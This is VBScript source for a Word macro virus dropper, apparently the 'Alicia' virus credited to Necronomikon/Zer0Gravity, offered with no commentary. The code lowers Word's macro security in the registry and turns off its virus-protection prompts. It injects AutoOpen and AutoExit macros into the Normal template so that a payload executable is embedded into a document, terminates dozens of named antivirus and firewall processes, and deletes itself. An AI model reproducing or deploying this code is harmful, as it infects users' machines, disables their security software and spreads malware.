   On Error Resume Next
   'Win32/Word97.Alicia
   '(c)by Necronomikon/Zer0Gravity
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set WinDir = fso.GetSpecialFolder(0)
   Set WSHShell = WScript.CreateObject("WScript.Shell")
   WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
   WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level", 1, "REG_DWORD"
   WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
   Set Backup = WScript.CreateObject("Word.Application")
   Backup.Options.VirusProtection = (Rnd * 0)
   Backup.Options.SaveNormalPrompt = (Rnd * 0)
   Set babe = fso.OpenTextFile(WScript.ScriptFullName, 1)
   ScriptRead16 = babe.ReadAll
   babe.Close

   Set DropFile = FSO.CreateTextFile("c:\sys1.dr0", True)
   DropFile.WriteLine "Sub AutoOpen()"
   DropFile.WriteLine "On Error Resume Next"
   DropFile.WriteLine "Dim nec() As Byte"
   DropFile.WriteLine "rem Win32/WM97.Alicia"
   DropFile.WriteLine "rem (c) by Necronomikon/ZeroGravity"
   DropFile.WriteLine "Open Environ(""WINDIR"") & ""\alicia.exe"" For Binary Access Read As #1"
   DropFile.WriteLine "ReDim nec(53247)"
   DropFile.WriteLine "Get #1, , nec"
   DropFile.WriteLine "Close #1"
   DropFile.WriteLine "Open ""C:\alicia.doc"" For Binary Access Write As #1"
   DropFile.WriteLine "Put #1, 36865, nec"
   DropFile.WriteLine "Close #1"
   DropFile.WriteLine "For I = 1 To Tasks.Count"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""_AVP32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""_AVPCC"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""_AVPM"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""ACKWIN32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""ALERTSVC"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""AMON.EXE"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""ANTIVIR"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""ATRACK"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""AVCONSOL"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""AVP.EXE"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""AVP32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""AVPCC.EXE"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""AVPM.EXE"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""AVP Monitor"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""AVSYNMGR"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""CFINET"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""CFINET32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""CLAW95"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""ESAFE.EXE"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""F-AGNT95"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""F-PROT95"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""F-STOPW"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""FP-WIN"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""FRW.EXE"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""IAMAPP"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""IAMSERV.EXE"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""ICMON"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""IKARUS Guard9x"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""IOMON98"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""LOCKDOWN2000"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""LOCKDOWNADVANCED"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""LUALL"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""LUCOMSERVER"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""MCAFEE"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""MCAfee VShield"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""MONITOR"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""N32SCANW"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NAVAPSVC"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NAVAPW32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NAVLU32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NAVRUNR"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NAVW32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NAVWNT"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NISSERV"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NISUM"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NMAIN"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NOD32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NORTON"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NPSSVC"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NRESQ32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NSCHED32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NSCHEDNT"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NSPLUGIN"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""NVC95"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""PCCIOMON"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""PCCMAIN"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""PCCWIN98"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""PCFWALLICON"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""POP3TRAP"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""PVIEW"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""PVIEW95"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""REGEDIT"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""RESCUE32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""RMVTRJANSAFEWEB"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""SCAN32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""SWEEP95"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""SYMPROXYSVC"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""TDS2-98"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""TDS2-NT"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""VET95"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""VETTRAY"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""VSECOMR"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""VSHWIN32"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""VSSTAT"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""WEBSCANX"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""WEBTRAP"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "If (Tasks.Item(I).Name = ""ZONEALARM"") Then Tasks.Item(I).Close"
   DropFile.WriteLine "Next"
   DropFile.WriteLine "kill ""c:\sys1.dr0"""
   DropFile.WriteLine "End Sub"
   DropFile.WriteLine "Sub AutoExit()"
   DropFile.WriteLine "On Error Resume Next"
   DropFile.WriteLine "ChangeFileOpenDirectory ""C:\"""
   DropFile.WriteLine "Documents.Open FileName:=""alicia.doc"", ConfirmConversions:=False, _"
   DropFile.WriteLine "ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="""", _"
   DropFile.WriteLine "PasswordTemplate:="""", Revert:=False, WritePasswordDocument:="""", _"
   DropFile.WriteLine "WritePasswordTemplate:="""", Format:=wdOpenFormatAuto"
   DropFile.WriteLine "End Sub"
   DropFile.Close

   Backup.Visible = False
   Set nt = Backup.NormalTemplate.vbproject.vbcomponents(1).codemodule
   Set iw = fso.OpenTextFile("c:\sys1.dr0", 1, True)
   nt.DeleteLines 1, nt.CountOfLines
   i = 1
   Do While iw.atendofstream <> True
   b = iw.readline
   nt.InsertLines i, b
   i = i + 1
   Loop
   Backup.NormalTemplate.Save
   SetAttr oword.NormalTemplate.Fullname, vbReadOnly
   Backup.NormalTemplate.Close
   WSHShell.RegDelete ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Alicia")
   fso.DeleteFile wscript.ScriptFullName
